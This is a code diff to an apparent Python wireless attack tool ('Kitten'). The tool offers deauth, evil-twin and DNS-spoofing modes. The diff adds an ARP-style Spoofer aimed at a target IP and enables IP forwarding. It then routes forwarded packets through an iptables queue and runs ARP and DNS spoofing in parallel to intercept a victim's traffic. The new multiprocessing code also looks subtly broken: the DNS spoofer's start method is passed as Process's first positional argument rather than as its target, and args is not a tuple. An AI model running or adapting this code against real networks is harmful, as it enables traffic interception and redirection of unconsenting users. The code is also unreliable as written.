@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from ipaddress import IPv4Address
 from json import load
+from multiprocessing import Process
 
 from objects.accesspoint import AccessPoint
 from objects.dns_spoofer import DNSSpoofer
@@ -10,6 +11,7 @@ from objects.interfaces import (Interface, InterfaceNotFoundError,
 from objects.iptables import Iptables
 from objects.machine import Machine
 from objects.network import Network
+from objects.spoofer import Spoofer
 
 from utils.args import ArgumentParser
 from utils.output import (print_attack_deauth_info, print_attack_eviltwin_info,
@@ -145,25 +147,40 @@ class Kitten:
                 print_text('Missing info method.', attrs=['bold'])
 
                 interface = self.get_interface_safe(self.options.get('interface'))
+                target_ip = self.options.get('target_ip')
+                host_ip = self.options.get('host_ip')
                 dns_hosts = load(open(self.options.get('host_to_ip'), 'r'))
 
                 self.handle_automode(interface)
+
+                spoofer = Spoofer(
+                    host_ip = host_ip,
+                    target_ip = target_ip,
+                )
+                spoofer.enable_ip_forwarding()
 
                 queue_num = 0
                 
                 iptables = Iptables()
                 iptables.insert_forward_rule(queue_num)
 
-                try:
+                p1 = Process(target=spoofer.start)
+                p2 = Process(
                     DNSSpoofer(
                         host_to_ip = dns_hosts,
                         interface = interface
-                    ).start(queue_num)
+                    ).start,
+                    args=(queue_num),
+                )
+
+                try:
+                    p1.start()
+                    p2.start()
+
                 except KeyboardInterrupt:
+                    spoofer.restore()
                     iptables.flush_rules()
                 
-            
-    
     def handle_automode(self, interface: Interface) -> None:
         if self.options['automode'] and interface.get_mode() != 'monitor':
             interface.switch_mode('monitor')
